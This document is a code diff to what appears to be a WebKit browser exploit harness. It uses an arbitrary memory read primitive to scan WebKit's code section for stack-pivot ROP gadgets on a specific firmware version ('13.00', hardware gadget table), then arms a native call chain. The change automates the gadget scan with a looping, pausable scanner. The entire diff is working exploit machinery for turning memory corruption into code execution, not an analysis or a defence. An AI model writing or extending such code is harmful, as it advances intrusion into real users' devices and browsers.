@@ -15,7 +15,7 @@ import {
 } from "./pivot_gadgets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828d";
+const BUILD_ID = "rw-20250828e";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -26,6 +26,8 @@ const SCAN_PIVOT_MAX = parseInt(params.get("scanmax") || "4800000", 16);
 const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "8000", 16);
 const SCAN_CHUNK = parseInt(params.get("scanchunk") || "256", 10);
 const SCAN_YIELD_EVERY = parseInt(params.get("scanyield") || "32", 10);
+const SCAN_PAUSE_MS = parseInt(params.get("scanpause") || "48", 10);
+const SCAN_LOG_EVERY = parseInt(params.get("scanlogevery") || "12", 10);
 const ELF_MAGIC = 0x464c457f;
 const SYS_GETPID = 20;
 const HW_GADGETS_1352 = {
@@ -70,6 +72,9 @@ let nativeChain = null;
 let nativeAllowed = false;
 let pivotReady = false;
 let pivotScan = null;
+let scanPivotAuto = false;
+let scanPivotStop = false;
+let scanPivotChunks = 0;
 
 function $(id) { return document.getElementById(id); }
 
@@ -186,7 +191,10 @@ function setUi() {
     if (btnSaveBases) btnSaveBases.disabled = busy || !ready;
     if (btnRwProof) btnRwProof.disabled = busy || !ready;
     if (btnVerifyPivot) btnVerifyPivot.disabled = busy || !ready;
-    if (btnScanPivot) btnScanPivot.disabled = busy || !ready;
+    if (btnScanPivot) {
+        btnScanPivot.disabled = !ready || (busy && !scanPivotAuto);
+        btnScanPivot.textContent = scanPivotAuto ? "Stop scan" : "Scan pivot (auto)";
+    }
     if (btnNative) {
         btnNative.disabled = busy || !ready || !nativeAllowed || !pivotReady;
         btnNative.title = pivotReady
@@ -675,8 +683,105 @@ function savePivotScanState(st) {
     try { sessionStorage.setItem("wk-pivot-scan-state", JSON.stringify(st)); } catch (_) { }
 }
 
-async function scanPivotChunk() {
-    if (busy || !ready || !window.p) return;
+/** One chunk — returns whether auto loop should continue. */
+async function scanPivotOneChunk(p, webkitBase, off, logProg) {
+    if (!pivotScan || String(pivotScan.base) !== String(webkitBase)) {
+        pivotScan = loadPivotScanState(webkitBase) || {
+            base: String(webkitBase),
+            rowIdx: 0,
+            cursor: null,
+            phase: "low",
+            found: pivotScanFoundInit(),
+        };
+    }
+    pivotScan.found = Object.assign(pivotScanFoundInit(), pivotScan.found);
+
+    if (advancePivotRowIdx(pivotScan)) {
+        mark("SCAN-DONE", "all pivot rows done — tap Verify pivot");
+        savePivotScanState(pivotScan);
+        return "done";
+    }
+
+    const row = PIVOT_ROWS[pivotScan.rowIdx];
+    const key = row[1];
+    const label = row[0];
+    const pat = pivotPattern(row, off);
+    if (!pivotScan.phase) pivotScan.phase = "low";
+    const range = pivotScanRange(key, pivotScan.phase);
+    let rva = pivotScan.cursor != null ? pivotScan.cursor : (range.minRva & ~3);
+    let steps = 0;
+    let hit = null;
+    const hint = pivotHint(key);
+
+    while (rva < range.maxRva && steps < SCAN_CHUNK) {
+        if (scanPatRead1(p, webkitBase, rva, pat)) {
+            if (hit == null || (hint > 0 && Math.abs(rva - hint) < Math.abs(hit - hint)))
+                hit = rva;
+        }
+        rva += 4;
+        steps++;
+        if ((steps & (SCAN_YIELD_EVERY - 1)) === 0)
+            await new Promise(r => setTimeout(r, 0));
+    }
+
+    pivotScan.cursor = rva;
+    savePivotScanState(pivotScan);
+
+    if (hit != null) {
+        pivotScan.found[key] = hit;
+        saveScannedPivot(webkitBase, pivotScan.found);
+        mark("SCAN-HIT", label + " +0x" + hit.toString(16)
+            + " phase=" + pivotScan.phase
+            + (hint ? " hint=+0x" + hint.toString(16) : ""));
+        pivotScan.rowIdx++;
+        pivotScan.cursor = null;
+        pivotScan.phase = "low";
+        savePivotScanState(pivotScan);
+        scanPivotChunks = 0;
+        updatePivotReady(p, loadEffectiveOff());
+        return "continue";
+    }
+
+    if (rva >= range.maxRva) {
+        if (pivotScan.phase === "low") {
+            pivotScan.phase = "hint";
+            pivotScan.cursor = null;
+            savePivotScanState(pivotScan);
+            mark("SCAN-PHASE", label + " low .text miss — retrying near 13.00 hint");
+            scanPivotChunks = 0;
+            return "continue";
+        }
+        mark("SCAN-MISS", label + " not found (low + hint) — paste RVA if you find on HW");
+        pivotScan.rowIdx++;
+        pivotScan.cursor = null;
+        pivotScan.phase = "low";
+        savePivotScanState(pivotScan);
+        scanPivotChunks = 0;
+        return "continue";
+    }
+
+    if (logProg) {
+        mark("SCAN-PROG", label + " phase=" + pivotScan.phase
+            + " @+0x" + rva.toString(16)
+            + " (" + steps + "/" + SCAN_CHUNK + " row " + (pivotScan.rowIdx + 1)
+            + "/" + PIVOT_ROWS.length + ")");
+    }
+    return "continue";
+}
+
+function stopPivotScanQuiet() {
+    scanPivotStop = true;
+    scanPivotAuto = false;
+}
+
+async function runPivotScanAuto() {
+    if (!ready || !window.p) return;
+    if (scanPivotAuto) {
+        scanPivotStop = true;
+        mark("SCAN-STOP", "stopping after current chunk…");
+        return;
+    }
+
     const p = window.p;
     const off = loadEffectiveOff();
     const { webkitBase } = basesFromSession(off);
@@ -685,89 +790,45 @@ async function scanPivotChunk() {
         return;
     }
 
+    scanPivotAuto = true;
+    scanPivotStop = false;
+    scanPivotChunks = 0;
+    let scanDoneVerify = false;
     busy = true;
     setUi();
+    state("pivot scan running…", "warn");
+    mark("SCAN-AUTO", "chunk=" + SCAN_CHUNK + " pause=" + SCAN_PAUSE_MS + "ms — tap Stop to cancel");
+
     try {
-        if (!pivotScan || String(pivotScan.base) !== String(webkitBase)) {
-            pivotScan = loadPivotScanState(webkitBase) || {
-                base: String(webkitBase),
-                rowIdx: 0,
-                cursor: null,
-                phase: "low",
-                found: pivotScanFoundInit(),
-            };
-        }
-        pivotScan.found = Object.assign(pivotScanFoundInit(), pivotScan.found);
-
-        if (advancePivotRowIdx(pivotScan)) {
-            mark("SCAN-DONE", "all pivot rows done — tap Verify pivot");
-            savePivotScanState(pivotScan);
-            return;
-        }
-
-        const row = PIVOT_ROWS[pivotScan.rowIdx];
-        const key = row[1];
-        const label = row[0];
-        const pat = pivotPattern(row, off);
-        if (!pivotScan.phase) pivotScan.phase = "low";
-        const range = pivotScanRange(key, pivotScan.phase);
-        let rva = pivotScan.cursor != null ? pivotScan.cursor : (range.minRva & ~3);
-        let steps = 0;
-        let hit = null;
-        const hint = pivotHint(key);
-
-        while (rva < range.maxRva && steps < SCAN_CHUNK) {
-            if (scanPatRead1(p, webkitBase, rva, pat)) {
-                if (hit == null || (hint > 0 && Math.abs(rva - hint) < Math.abs(hit - hint)))
-                    hit = rva;
+        while (scanPivotAuto && !scanPivotStop) {
+            scanPivotChunks++;
+            const logProg = (scanPivotChunks === 1)
+                || (scanPivotChunks % SCAN_LOG_EVERY === 0);
+            const st = await scanPivotOneChunk(p, webkitBase, off, logProg);
+            if (st === "done") {
+                scanDoneVerify = true;
+                state("pivot scan done", "ok");
+                break;
             }
-            rva += 4;
-            steps++;
-            if ((steps & (SCAN_YIELD_EVERY - 1)) === 0)
-                await new Promise(r => setTimeout(r, 0));
+            if (scanPivotStop) break;
+            await new Promise(r => setTimeout(r, SCAN_PAUSE_MS));
         }
-
-        pivotScan.cursor = rva;
-        savePivotScanState(pivotScan);
-
-        if (hit != null) {
-            pivotScan.found[key] = hit;
-            saveScannedPivot(webkitBase, pivotScan.found);
-            mark("SCAN-HIT", label + " +0x" + hit.toString(16)
-                + " phase=" + pivotScan.phase
-                + (hint ? " hint=+0x" + hint.toString(16) : ""));
-            pivotScan.rowIdx++;
-            pivotScan.cursor = null;
-            pivotScan.phase = "low";
-            savePivotScanState(pivotScan);
-            mark("SCAN-NEXT", "tap again for next gadget (one row per tap — OOM safe)");
-            return;
-        }
-
-        if (rva >= range.maxRva) {
-            if (pivotScan.phase === "low") {
-                pivotScan.phase = "hint";
-                pivotScan.cursor = null;
-                savePivotScanState(pivotScan);
-                mark("SCAN-PHASE", label + " low .text miss — retrying near 13.00 hint");
-                return;
-            }
-            mark("SCAN-MISS", label + " not found (low + hint) — paste RVA if you find on HW");
-            pivotScan.rowIdx++;
-            pivotScan.cursor = null;
-            pivotScan.phase = "low";
-            savePivotScanState(pivotScan);
-            return;
-        }
-
-        mark("SCAN-PROG", label + " phase=" + pivotScan.phase
-            + " @+0x" + rva.toString(16)
-            + " (" + steps + "/" + SCAN_CHUNK + " row " + (pivotScan.rowIdx + 1)
-            + "/" + PIVOT_ROWS.length + ")");
+        if (scanPivotStop)
+            mark("SCAN-STOP", "cancelled");
+    } catch (err) {
+        mark("SCAN-FAIL", err.message || String(err));
+        state("scan error", "bad");
     } finally {
+        scanPivotAuto = false;
+        scanPivotStop = false;
         busy = false;
         setUi();
+        if (scanDoneVerify) verifyPivotManual();
     }
+}
+
+async function scanPivotChunk() {
+    return runPivotScanAuto();
 }
 
 function verifyPivotManual() {
@@ -1186,7 +1247,7 @@ function init() {
     wireClick(btnSaveBases, saveBasesManual);
     wireClick(btnRwProof, function () { return runRwProofManual(); });
     wireClick(btnVerifyPivot, verifyPivotManual);
-    wireClick(btnScanPivot, function () { return scanPivotChunk(); });
+    wireClick(btnScanPivot, function () { return runPivotScanAuto(); });
     wireClick(btnNative, function () { return runNativeCall(); });
     wireClick(btnClear, function () {
         lines.length = 0;
@@ -1222,6 +1283,7 @@ function init() {
     mark("BOOT", "build=" + BUILD_ID + " — pivot RVAs not from 13.00 (scan before native call)");
     mark("BOOT", groomBootLine(params));
     window.addEventListener("beforeunload", function () {
+        stopPivotScanQuiet();
         if (stateEl) persistState(stateEl.textContent, stateEl.className);
         if (nativeChain) try { nativeChain.disarm(); } catch (_) { }
     });
